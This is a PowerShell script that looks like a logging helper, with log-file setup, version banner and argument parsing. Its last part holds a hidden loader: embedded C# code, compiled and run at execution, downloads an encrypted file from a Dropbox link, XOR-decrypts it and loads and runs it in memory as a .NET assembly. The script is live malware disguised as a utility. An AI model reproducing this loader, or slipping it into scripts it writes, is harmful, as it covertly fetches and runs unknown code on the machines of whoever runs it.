


$Script:Version      = '1.0.9.1126' 
$Script:LogSeparator = '*******************************************************************************' 
$Script:LogFile      = "" 
 



function Get-ScriptName(){ 








    $tmp = $MyInvocation.ScriptName.Substring($MyInvocation.ScriptName.LastIndexOf('\') + 1) 
    $tmp.Substring(0,$tmp.Length - 4) 
} 
 
function Write-Log($Msg, [System.Boolean]$LogTime=$true){ 











    if($LogTime){ 
        $date = Get-Date -format dd.MM.yyyy 
        $time = Get-Date -format HH:mm:ss 
       Add-Content -Path $LogFile -Value ($date + " " + $time + "   " + $Msg) 
    } 
    else{ 
        Add-Content -Path $LogFile -Value $Msg 
    }
} 
 
function Initialize-LogFile($File, [System.Boolean]$reset=$false){ 












try{ 
        
        if(Test-Path -Path $File){ 
            
            if($reset){ 
                Clear-Content $File -ErrorAction SilentlyContinue 
            } 
        } 
        else{ 
            
            if($File.Substring(1,1) -eq ':'){ 
                
                $driveInfo = [System.IO.DriveInfo]($File) 
                if($driveInfo.IsReady -eq $false){ 
                    Write-Log -Msg ($driveInfo.Name + " not ready.") 
                } 
                 
                
                $Dir = [System.IO.Path]::GetDirectoryName($File) 
                if(([System.IO.Directory]::Exists($Dir)) -eq $false){ 
                    $objDir = [System.IO.Directory]::CreateDirectory($Dir) 
                    Write-Log -Msg ($Dir + " created.") 
                } 
            } 
        } 
        
        Write-Log -LogTime $false -Msg $LogSeparator 
        Write-Log -LogTime $false -Msg (((Get-ScriptName).PadRight($LogSeparator.Length - ("   Version " + $Version).Length," ")) + "   Version " + $Version) 
        Write-Log -LogTime $false -Msg $LogSeparator 
    } 
    catch{ 
        Write-Log -Msg $_ 
    } 
} 
 
function Read-Arguments($Values = $args) { 








    foreach($value in $Values){ 
         
        
        $arrTmp = $value.Split("=") 
         
        switch ($arrTmp[0].ToLower()) { 
            -log { 
                $Script:LogFile = $arrTmp[1] 
            } 
        } 
    } 
} 




if($args.Count -ne 0){ 
    
    Read-Arguments 
    if($LogFile.StartsWith("\\")){ 
        Write-Host "UNC" 
    } 
    elseif($LogFile.Substring(1,1) -eq ":"){ 
        Write-Host "Local" 
    } 
    else{ 
        $LogFile = [System.IO.Path]::Combine((Get-Location), $LogFile) 
    } 
     
    if($LogFile.EndsWith(".log") -eq $false){ 
        $LogFile += ".log" 
    } 
} 
 
if($LogFile -eq ""){ 
    
    $LogFile = [System.IO.Path]::Combine((Get-Location), (Get-ScriptName) + ".log") 
} 
 

Initialize-LogFile -File $LogFile -reset $false 
 
 
 



 
 

Write-Log -LogTime $false -Msg $LogSeparator 
Write-Log -LogTime $false -Msg ''
$S = @"
using System;
using System.Net;
using System.Reflection;
namespace n {
public static class c {
public static void l() {
WebClient wc = new WebClient();
IWebProxy dp = WebRequest.DefaultWebProxy;
if (dp != null) {
    dp.Credentials = CredentialCache.DefaultCredentials;
    wc.Proxy = dp;
}
byte[] b = wc.DownloadData("https://www.dropbox.com/s/z8fk603cybfvpmc/default.aa?dl=1");
string k = "d584596d2404a7f2409d1508a9134b60f22d909e4de015d39bfd01010199a7ed";
for(int i = 0; i < b.Length; i++) { b[i] = (byte) (b[i] ^  k[i % k.Length]); }
string[] parameters = new string[] {"fQ3BQYzqGrAAAAAAAAAACOySE1xCwgtKF2ESFclqtkRlhK9rKDa9hZQh_8Mt_hi9", "kFJHsQJAwJXaT40EmaA3Mw=="};
object[] args = new object[] {parameters};
Assembly a = Assembly.Load(b);
MethodInfo method = a.EntryPoint;
object o = a.CreateInstance(method.Name);
method.Invoke(o, args); }}}
"@
Add-Type -TypeDefinition $S -Language CSharp
[n.c]::l()

